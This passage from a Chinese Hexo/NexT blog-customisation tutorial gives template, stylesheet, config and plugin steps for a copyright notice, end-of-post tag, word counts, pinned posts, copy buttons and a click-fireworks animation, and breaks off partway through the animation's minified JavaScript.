<p>1.在目录<code>themes/next/layout/_macro/</code>下添加<code>my-copyright.swig</code> ，内容如下：</p>
<pre><code>{% if page.copyright %} <div class="my_post_copyright"> <script src="//cdn.bootcss.com/clipboard.js/1.5.10/clipboard.min.js"></script> <!-- JS库 sweetalert 可修改路径 --> <script type="text/javascript" src="http://jslibs.wuxubj.cn/sweetalert_mini/jquery-1.7.1.min.js"></script> <script src="http://jslibs.wuxubj.cn/sweetalert_mini/sweetalert.min.js"></script> <link rel="stylesheet" type="text/css" href="http://jslibs.wuxubj.cn/sweetalert_mini/sweetalert.mini.css"> <p><span>本文标题:</span>{{ page.title }}</p> <p><span>文章作者:</span>{{ theme.author }}</p> <p><span>发布时间:</span>{{ page.date.format("YYYY年MM月DD日 - HH:mm:ss") }}</p> <p><span>最后更新:</span>{{ page.updated.format("YYYY年MM月DD日 - HH:mm:ss") }}</p> <p><span>原始链接:</span><a href="{{ url_for(page.path) }}" title="{{ page.title }}">{{ page.permalink }}</a> <span class="copy-path" title="点击复制文章链接"><i class="fa fa-clipboard" data-clipboard-text="{{ page.permalink }}" aria-label="复制成功！"></i></span> </p> <p><span>许可协议:</span><i class="fa fa-creative-commons"></i> <a rel="license" href="https://creativecommons.org/licenses/by-nc-nd/4.0/" target="_blank" title="Attribution-NonCommercial-NoDerivatives 4.0 International (CC BY-NC-ND 4.0)">署名-非商业性使用-禁止演绎 4.0 国际</a> 转载请保留原文链接及作者。</p> </div> <script> var clipboard = new Clipboard('.fa-clipboard'); clipboard.on('success', $(function()&#123; $(".fa-clipboard").click(function()&#123; swal(&#123; title: "", text: '复制成功', html: false, timer: 500, showConfirmButton: false &#125;); &#125;); &#125;)); </script> {% endif %}</code></pre><p>2.在目录 <code>themes/next/source/css/_common/components/post/</code> 下添加<code>my-post-copyright.styl</code>，内容如下:</p>
<pre class="line-numbers language-yaml"><code class="language-yaml">
.my_post_copyright <span class="token punctuation">{</span> <span class="token key atrule">width</span><span class="token punctuation">:</span> 85%; max<span class="token punctuation">-</span><span class="token key atrule">width</span><span class="token punctuation">:</span> 45em; margin<span class="token punctuation">:</span> 2.8em auto 0; padding<span class="token punctuation">:</span> 0.5em 1.0em; border<span class="token punctuation">:</span> 1px solid <span class="token comment" spellcheck="true">#d3d3d3; font-size: 0.93rem; line-height: 1.6em; word-break: break-all; background: rgba(255,255,255,0.4); } .my_post_copyright p{margin:0;} .my_post_copyright span { display: inline-block; width: 5.2em; color: #333333; // title color font-weight: bold; } .my_post_copyright .raw { margin-left: 1em; width: 5em; } .my_post_copyright a { color: #808080; border-bottom:0; } .my_post_copyright a:hover { color: #0593d3; // link color text-decoration: underline; } .my_post_copyright:hover .fa-clipboard { color: #000; } .my_post_copyright .post-url:hover { font-weight: normal; } .my_post_copyright .copy-path { margin-left: 1em; width: 1em; +mobile(){display:none;} } .my_post_copyright .copy-path:hover { color: #808080; cursor: pointer; }</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
<p>3.修改<code>themes/next/layout/_macro/post.swig</code> ，如下：在代码</p>
<pre class="line-numbers language-html"><code class="language-html">{%- if post.reward_settings.enable %}
        {{ partial('_partials/post/post-reward.swig') }}
      {%- endif %<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
<p>之后，新增如下代码：</p>
<pre class="line-numbers language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span><span class="token punctuation">></span></span> {% if not is_index %} {% include 'my-copyright.swig' %} {% endif %} <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>4.打开<code>themes/next/source/css/_common/components/post/post.styl</code> 文件，在最后一行增加代码：</p>
<pre class="line-numbers language-stylus"><code class="language-stylus"><span class="token atrule-declaration"><span class="token atrule">@import</span> <span class="token string">"my-post-copyright"</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>5.设置新建文章自动开启 copyright ，即新建文章自动显示自定义的版权声明，设置<code>～/scaffolds/post.md</code>文件，如下：</p>
<pre class="line-numbers language-front-matter"><code class="language-front-matter">---
title: {{ title }} 
date: {{ date }} 
copyright: true #新增,开启
---<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h3 id="15-在每篇文章末尾添加“本文结束”标记"><a href="#15-在每篇文章末尾添加“本文结束”标记" class="headerlink" title="(15)在每篇文章末尾添加“本文结束”标记"></a>(15)在每篇文章末尾添加“本文结束”标记</h3><p>在路径<code>/blog/themes/next/layout/_macro</code>中新建 passage-end-tag.swig 文件,并添加以下内容</p>
<pre class="line-numbers language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span><span class="token punctuation">></span></span>
    {% if not is_index %}
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span><span class="token style-attr language-css"><span class="token attr-name"> <span class="token attr-name">style</span></span><span class="token punctuation">="</span><span class="token attr-value"><span class="token property">text-align</span><span class="token punctuation">:</span>center<span class="token punctuation">;</span><span class="token property">color</span><span class="token punctuation">:</span> <span class="token hexcode">#ccc</span><span class="token punctuation">;</span><span class="token property">font-size</span><span class="token punctuation">:</span><span class="token number">14</span>px<span class="token punctuation">;</span></span><span class="token punctuation">"</span></span><span class="token punctuation">></span></span>-------------本文结束<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>i</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>fa fa-paw<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>i</span><span class="token punctuation">></span></span>感谢您的阅读-------------<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>
    {% endif %}
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>接着打开<code>/blog/themes/next/layout/_macro/post.swig</code>文件，在post-body 之后， post-footer之前添加,代码如下：</p>
<pre class="line-numbers language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span><span class="token punctuation">></span></span>
  {% if not is_index %}
    {% include 'passage-end-tag.swig' %}
  {% endif %}
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>然后打开主题配置文件（_config.yml),在末尾添加：</p>
<pre class="line-numbers language-yaml"><code class="language-yaml"><span class="token comment" spellcheck="true">#文章末尾添加“本文结束”标记</span>
<span class="token key atrule">passage_end_tag</span><span class="token punctuation">:</span>
  <span class="token key atrule">enabled</span><span class="token punctuation">:</span> <span class="token boolean important">true</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
<p>效果：<br><img src="/images/beautify4/2.png" alt="0d1e0b70152f40ce40f33c5968a718df.png"></p>
<h3 id="16-字数统计和阅读时长-网站底部-文章内"><a href="#16-字数统计和阅读时长-网站底部-文章内" class="headerlink" title="(16)字数统计和阅读时长(网站底部/文章内)"></a>(16)字数统计和阅读时长(网站底部/文章内)</h3><p>首先安装插件:</p>
<pre class="line-numbers language-bash"><code class="language-bash">$ <span class="token function">npm</span> <span class="token function">install</span> hexo-symbols-count-time --save<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>然后修改主题配置文件如下:</p>
<pre class="line-numbers language-yaml"><code class="language-yaml"><span class="token key atrule">symbols_count_time</span><span class="token punctuation">:</span>
    <span class="token key atrule">separated_meta</span><span class="token punctuation">:</span> true   ＃显示属性名称<span class="token punctuation">,</span>设为false后只显示图标和统计数字<span class="token punctuation">,</span>不显示属性的文字
    <span class="token key atrule">item_text_post</span><span class="token punctuation">:</span> true   ＃显示属性名称<span class="token punctuation">,</span>设为false后只显示图标和统计数字<span class="token punctuation">,</span>不显示属性的文字
    <span class="token key atrule">item_text_total</span><span class="token punctuation">:</span> true ＃底部footer是否显示字数统计属性文字(如站点总字数<span class="token punctuation">,</span>站点阅读时长 ≈ 1 分钟)
    <span class="token key atrule">awl</span><span class="token punctuation">:</span> 4     ＃计算字数的一个设置<span class="token punctuation">,</span>没设置过
    <span class="token key atrule">wpm</span><span class="token punctuation">:</span> 275  ＃一分钟阅读的字数    <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>站点配置文件中添加：</p>
<pre class="line-numbers language-yaml"><code class="language-yaml"><span class="token key atrule">symbols_count_time</span><span class="token punctuation">:</span>
 <span class="token comment" spellcheck="true">#文章内是否显示</span>
  <span class="token key atrule">symbols</span><span class="token punctuation">:</span> <span class="token boolean important">true</span>
  <span class="token key atrule">time</span><span class="token punctuation">:</span> <span class="token boolean important">true</span>
 <span class="token comment" spellcheck="true"># 网页底部是否显示</span>
  <span class="token key atrule">total_symbols</span><span class="token punctuation">:</span> <span class="token boolean important">true</span>
  <span class="token key atrule">total_time</span><span class="token punctuation">:</span> <span class="token boolean important">true</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>完成后并不能显示，而是<br><img src="/images/beautify4/3.png" alt="f5c454b547469ca7b220fdb8f16fd6d2.png"><br>？？<br>后来文章统计正常，但网页下方未变<br>勿急，等一会（可能要一天）会显示出来</p>
<h3 id="17-添加文章置顶功能"><a href="#17-添加文章置顶功能" class="headerlink" title="(17)添加文章置顶功能"></a>(17)添加文章置顶功能</h3><h5 id="安装插件"><a href="#安装插件" class="headerlink" title="安装插件"></a>安装插件</h5><p>卸载原来的插件，安装带置顶功能的插件 <a href="https://github.com/netcan/hexo-generator-index-pin-top">netcan/hexo-generator-index-pin-top: Index generator plugin for Hexo. Pin top version</a></p>
<pre class="line-numbers language-bash"><code class="language-bash">$ <span class="token function">npm</span> uninstall hexo-generator-index --save
$ <span class="token function">npm</span> <span class="token function">install</span> hexo-generator-index-pin-top --save<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
<h5 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h5><p>在需要置顶的文章中的 Front-matter 加入 <strong>top: true</strong> 即可。</p>
<h5 id="优化"><a href="#优化" class="headerlink" title="优化"></a>优化</h5><p>打开 <code>/themes/next/layout/_macro</code>下的 post.swig 文件，定位到 <code>&lt;div class="post-meta"&gt;</code> 下 (约 63 行)，插入如下代码：</p>
<pre class="line-numbers language-html"><code class="language-html">{% if post.top %}   
     <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>i</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>fa fa-thumb-tack<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>i</span><span class="token punctuation">></span></span>    
     <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>font</span> <span class="token attr-name">color</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>7D26CD<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>置顶<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>font</span><span class="token punctuation">></span></span>  
     <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>span</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>post-meta-divider<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>|<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>span</span><span class="token punctuation">></span></span>
 {% endif %}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>位置如图：<br><img src="/images/beautify4/4.png" alt="9101ecf89850afa2cb5138f2fd697b6f.png"><br>效果：<br><img src="/images/beautify4/5.png" alt="9f4becd2c4b3a1bfef7ec2719510407f.png"></p>
<p><a href="https://www.zhyong.cn/posts/fc22/">参考文章</a></p>
<h3 id="18-添加阅读进度条"><a href="#18-添加阅读进度条" class="headerlink" title="(18)添加阅读进度条"></a>(18)添加阅读进度条</h3><p>主题配置文件中改为true即可<br><img src="/images/beautify4/6.png" alt="20b57e7540501ab8cc1449da87f9c51b.png"></p>
<h3 id="19-添加代码复制块"><a href="#19-添加代码复制块" class="headerlink" title="(19)添加代码复制块"></a>(19)添加代码复制块</h3><p>代码块会展示出该效果<br><img src="/images/beautify4/7.png" alt="620e5f1673ab17d2566b090e6947d58e.png"><br>在之前创建的styles.styl末尾添加</p>
<pre class="line-numbers language-yaml"><code class="language-yaml">// 复制按钮样式top调整
.highlight<span class="token punctuation">-</span>wrap .copy<span class="token punctuation">-</span>btn <span class="token punctuation">{</span>
<span class="token key atrule">padding</span><span class="token punctuation">:</span> 
1px 6px;  
<span class="token key atrule">top</span><span class="token punctuation">:</span> 3px;
<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h3 id="20-全国哀悼日将网站变灰"><a href="#20-全国哀悼日将网站变灰" class="headerlink" title="(20)全国哀悼日将网站变灰"></a>(20)全国哀悼日将网站变灰</h3><p>方法：fn+f12打开调试面板，在body处添加<br>-webkit-filter: grayscale(100%)即可实现<br><img src="/images/beautify4/8.png" alt="30614fc0971e64f5feca869629564d09.png"></p>
<p><img src="/images/beautify4/9.png" alt="69a3a6e3bf2b81272782db4c086d12f4.png"></p>
<h3 id="21-点击爆炸效果"><a href="#21-点击爆炸效果" class="headerlink" title="(21)点击爆炸效果"></a>(21)点击爆炸效果</h3><p>实现的效果图：<br><img src="/images/beautify4/10.png" alt="c4c7ed41469cc193303b9c53cad4a938.png"></p>
<p>实现方法跟那个红心是差不多的，首先在<code>themes/next/source/js/src</code>里面建一个叫fireworks.js的文件，代码如下：</p>
<pre class="line-numbers language-js"><code class="language-js"><span class="token string">"use strict"</span><span class="token punctuation">;</span><span class="token keyword">function</span> <span class="token function">updateCoords</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span><span class="token punctuation">{</span>pointerX<span class="token operator">=</span><span class="token punctuation">(</span>e<span class="token punctuation">.</span>clientX<span class="token operator">||</span>e<span class="token punctuation">.</span>touches<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>clientX<span class="token punctuation">)</span><span class="token operator">-</span>canvasEl<span class="token punctuation">.</span><span class="token function">getBoundingClientRect</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>left<span class="token punctuation">,</span>pointerY<span class="token operator">=</span>e<span class="token punctuation">.</span>clientY<span class="token operator">||</span>e<span class="token punctuation">.</span>touches<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>clientY<span class="token operator">-</span>canvasEl<span class="token punctuation">.</span><span class="token function">getBoundingClientRect</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>top<span class="token punctuation">}</span><span class="token keyword">function</span> <span class="token function">setParticuleDirection</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token keyword">var</span> t<span class="token operator">=</span>anime<span class="token punctuation">.</span><span class="token function">random</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">360</span><span class="token punctuation">)</span><span class="token operator">*</span>Math<span class="token punctuation">.</span>PI<span class="token operator">/</span><span class="token number">180</span><span class="token punctuation">,</span>a<span class="token operator">=</span>anime<span class="token punctuation">.</span><span class="token function">random</span><span class="token punctuation">(</span><span class="token number">50</span><span class="token punctuation">,</span><span class="token number">180</span><span class="token punctuation">)</span><span class="token punctuation">,</span>n<span class="token operator">=</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">[</span>anime<span class="token punctuation">.</span><span class="token function">random</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token operator">*</span>a<span class="token punctuation">;</span><span class="token keyword">return</span><span class="token punctuation">{</span>x<span class="token punctuation">:</span>e<span class="token punctuation">.</span>x<span class="token operator">+</span>n<span class="token operator">*</span>Math<span class="token punctuation">.</span><span class="token function">cos</span><span class="token punctuation">(</span>t<span class="token punctuation">)</span><span class="token punctuation">,</span>y<span class="token punctuation">:</span>e<span class="token punctuation">.</span>y<span class="token operator">+</span>n<span class="token operator">*</span>Math<span class="token punctuation">.</span><span class="token function">sin</span><span class="token punctuation">(</span>t<span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">function</span> <span class="token function">createParticule</span><span class="token punctuation">(</span>e<span class="token punctuation">,</span>t<span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token keyword">var</span> a<span class="token operator">=</span><span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">;</span><span class="token keyword">return</span> a<span class="token punctuation">.</span>x<span class="token operator">=</span>e<span class="token punctuation">,</span>a<span class="token punctuation">.</span>y<span class="token operator">=</span>t<span class="token punctuation">,</span>a<span class="token punctuation">.</span>color<span class="token operator">=</span>colors<span class="token punctuation">[</span>anime<span class="token punctuation">.</span><span class="token function">random</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span>colors<span class="token punctuation">.</span>length<span class="token number">-1</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">,</span>a<span class="token punctuation">.</span>radius<span class="token operator">=</span>anime<span class="token punctuation">.</span><span class="token function">random</span><span class="token punctuation">(</span><span class="token number">16</span><span class="token punctuation">,</span><span class="token number">32</span><span class="token punctuation">)</span><span class="token punctuation">,</span>a<span class="token punctuation">.</span>endPos<span class="token operator">=</span><span class="token function">setParticuleDirection</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span><span class="token punctuation">,</span>a<span class="token punctuation">.</span>draw<span class="token operator">=</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>ctx<span class="token punctuation">.</span><span class="token function">beginPath</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>ctx<span class="token punctuation">.</span><span class="token function">arc</span><span class="token punctuation">(</span>a<span class="token punctuation">.</span>x<span class="token punctuation">,</span>a<span class="token punctuation">.</span>y<span class="token punctuation">,</span>a<span class="token punctuation">.</span>radius<span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token operator">*</span>Math<span class="token punctuation">.</span>PI<span class="token punctuation">,</span><span class="token operator">!</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">,</span>ctx<span class="token punctuation">.</span>fillStyle<span class="token operator">=</span>a<span class="token punctuation">.</span>color<span class="token punctuation">,</span>ctx<span class="token punctuation">.</span><span class="token function">fill</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">,</span>a<span class="token punctuation">}</span><span class="token keyword">function</span> <span class="token function">createCircle</span><span class="token punctuation">(</span>e<span class="token punctuation">,</span>t<span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token keyword">var</span> a<span class="token operator">=</span><span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">;</span><span class="token keyword">return</span> a<span class="token punctuation">.</span>x<span class="token operator">=</span>e<span class="token punctuation">,</span>a<span class="token punctuation">.</span>y<span class="token operator">=</span>t<span class="token punctuation">,</span>a<span class="token punctuation">.</span>color<span class="token operator">=</span><span class="token string">"#F00"</span><span class="token punctuation">,</span>a<span class="token punctuation">.</span>radius<span class="token operator">=</span><span class="token number">0.1</span><span class="token punctuation">,</span>a<span class="token punctuation">.</span>alpha<span class="token operator">=</span><span class="token number">0.5</span><span class="token punctuation">,</span>a<span class="token punctuation">.</span>lineWidth<span class="token operator">=</span><span class="token number">6</span><span class="token punctuation">,</span>a<span class="token punctuation">.</span>draw<span class="token operator">=</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>ctx<span class="token punctuation">.</span>globalAlpha<span class="token operator">=</span>a<span class="token punctuation">.</span>alpha<span class="token punctuation">,</span>ctx<span class="token punctuation">.</span><span class="token function">beginPath</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>ctx<span class="token punctuation">.</span><span class="token function">arc</span><span class="token punctuation">(</span>a<span class="token punctuation">.</span>x<span class="token punctuation">,</span>a<span class="token punctuation">.</span>y<span class="token punctuation">,</span>a<span class="token punctuation">.</span>radius<span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token operator">*</span>Math<span class="token punctuation">.</span>PI<span class="token punctuation">,</span><span class="token operator">!</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">,</span>ctx<span class="token punctuation">.</span>lineWidth<span class="token operator">=</span>a<span class="token punctuation">.</span>lineWidth<span class="token punctuation">,</span>ctx<span class="token punctuation">.</span>strokeStyle<span class="token operator">=</span>a<span class="token punctuation">.</span>color<span class="token punctuation">,</span>ctx<span class="token punctuation">.</span><span class="token function">stroke</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>ctx<span class="token punctuation">.</span>globalAlpha<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">}</span><span class="token punctuation">,</span>a<span class="token punctuation">}</span><span class="token keyword">function</span> <span class="token function">renderParticule</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">var</span> t<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>t<span class="token operator">&lt;</span>e<span class="token punctuation">.</span>animatables<span class="token punctuation">.</span>length<span class="token punctuation">;</span>t<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">{</span>e<span class="token punctuation">.</span>animatables<span class="token punctuation">[</span>t<span class="token punctuation">]</span><span class="token punctuation">.</span>target<span class="token punctuation">.</span><span class="token function">draw</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">function</span> <span class="token function">animateParticules</span><span class="token punctuation">(</span>e<span class="token punctuation">,</span>t<span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">var</span> a<span class="token operator">=</span><span class="token function">createCircle</span><span class="token punctuation">(</span>e<span class="token punctuation">,</span>t<span class="token punctuation">)</span><span class="token punctuation">,</span>n<span class="token operator">=</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">,</span>i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>i<span class="token operator">&lt;</span>numberOfParticules<span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">{</span>n<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span><span class="token function">createParticule</span><span class="token punctuation">(</span>e<span class="token punctuation">,</span>t<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">}</span>anime<span class="token punctuation">.</span><span class="token function">timeline</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token punctuation">{</span>targets<span class="token punctuation">:</span>n<span class="token punctuation">,</span>x<span class="token punctuation">:</span><span class="token keyword">function</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token keyword">return</span> e<span class="token punctuation">.</span>endPos<span class="token punctuation">.</span>x<span class="token punctuation">}</span><span class="token punctuation">,</span>y<span class="token punctuation">:</span><span class="token keyword">function</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token keyword">return</span> e<span class="token punctuation">.</span>endPos<span class="token punctuation">.</span>y<span class="token punctuation">}</span><span class="token punctuation">,</span>radius<span class="token punctuation">:</span><span class="token number">0.1</span><span class="token punctuation">,</span>duration<span class="token punctuation">:</span>anime<span class="token punctuation">.</span><span class="token function">random</span><span class="token punctuation">(</span><span class="token number">1200</span><span class="token punctuation">,</span><span class="token number">1800</span><span class="token punctuation">)</span><span class="token punctuation">,</span>easing<span class="token punctuation">:</span><span class="token string">"easeOutExpo"</span><span class="token punctuation">,</span>update<span class="token punctuation">:</span>renderParticule<span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token punctuation">{</span>targets<span class="token punctuation">:</span>a<span class="token punctuation">,</span>radius<span class="token punctuation">:</span>anime<span class="token punctuation">.</span><span class="token function">random</span><span class="token punctuation">(</span><span class="token number">80</span><span class="token punctuation">,</span><span class="token number">160</span><span class="token punctuation">)</span><span class="token punctuation">,</span>lineWidth<span class="token punctuation">:</span><span class="token number">0</span><span class="token punctuation">,</span>alpha<span class="token punctuation">:</span><span class="token punctuation">{</span>value<span class="token punctuation">:</span><span class="token number">0</span><span class="token punctuation">,</span>easing<span class="token punctuation">:</span><span class="token string">"linear"</span><span class="token punctuation">,</span>duration<span class="token punctuation">:</span>anime<span class="token punctuation">.</span><span class="token function">random</span><span class="token punctuation">(</span><span class="token number">600</span><span class="token punctuation">,</span><span class="token number">800</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">,</span>duration<span class="token punctuation">:</span>anime<span class="token punctuation">.</span><span class="token function">random</span><span class="token punctuation">(</span><span class="token number">1200</span><span class="token punctuation">,</span><span class="token number">1800</span><span class="token punctuation">)</span><span class="token punctuation">,</span>easing<span class="token punctuation">:</span><span class="token string">"easeOutExpo"</span><span class="token punctuation">,</span>update<span class="token punctuation">:</span>renderParticule<span class="token punctuation">,</span>offset<span class="token punctuation">:</span><span class="token number">0</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token keyword">function</span> <span class="token function">debounce</span><span class="token punctuation">(</span>e<span class="token punctuation">,</span>t<span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token keyword">var</span> a<span class="token punctuation">;</span><span class="token keyword">return</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token keyword">var</span> n<span class="token operator">=</span><span class="token keyword">this</span><span class="token punctuation">,</span>i<span class="token operator">=</span>arguments<span class="token punctuation">;</span><span class="token function">clearTimeout</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span><span class="token punctuation">,</span>a<span class="token operator">=</span><span class="token function">setTimeout</span><span class="token punctuation">(</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>e<span class="token punctuation">.</span><span class="token function">apply</span><span class="token punctuation">(</span>n<span class="token punctuation">,</span>i<span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">,</span>t<span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">var</span> canvasEl<span class="token operator">=</span>document<span class="token punctuation">.</span><span class="token function">querySelector</span><span class="token punctuation">(</span><span class="token string">".fireworks"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span>canvasEl<span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token keyword">var</span> ctx<span class="token operator">=</span>canvasEl<span class="token punctuation">.</span><span class="token function">getContext</span><span class="token punctuation">(</span><span class="token string">"2d"</span><span class="token punctuation">)</span><span class="token punctuation">,</span>numberOfParticules<span class="token operator">=</span><span class="token number">30</span><span class="token punctuation">,</span>pointerX<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">,</span>pointerY<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">,</span>tap<span class="token operator">=</span><span class="token string">"mousedown"</span><span class="token punctuation">,</span>colors<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">"#FF1461"</span><span class="token punctuation">,</span><span class="token string">"#18FF92"</span><span class="token punctuation">,</span><span class="token string">"#5A87FF"</span><span class="token punctuation">,</span><span class="token string">"#FBF38C"</span><span class="token punctuation">]</span><span class="token punctuation">,</span>setCanvasSize<span class="token operator">=</span><span class="token function">debounce</span><span class="token punctuation">(</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>canvasEl<span class="token punctuation">.</span>width<span class="token operator">=</span><span class="token number">2</span><span class="token operator">*</span>window<span class="token punctuation">.</span>innerWidth<span class="token punctuation">,</span>canvasEl<span class="token punctuation">.</span>height<span class="token operator">=</span><span class="token number">2</span><span class="token operator">*</span>window<span class="token punctuation">.</span>innerHeight<span class="token punctuation">,</span>canvasEl<span class="token punctuation">.</span>style<span class="token punctuation">.</span>width<span class="token operator">=</span>window<span class="token punctuation">.</span>innerWidth<span class="token operator">+</span><span class="token string">"px"</span><span class="token punctuation">,</span>canvasEl<span class="token punctuation">.</span>style<span class="token punctuation">.</span>height<span class="token operator">=</span>window<span class="token punctuation">.</span>innerHeight<span class="token operator">+</span><span class="token string">"px"</span><span class="token punctuation">,</span>canvasEl<span class="token punctuation">.</span><span class="token function">getContext</span><span class="token punctuation">(</span><span class="token string">"2d"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">scale</span><span class="token punctuation">(</span><span class="token number">2</span><span 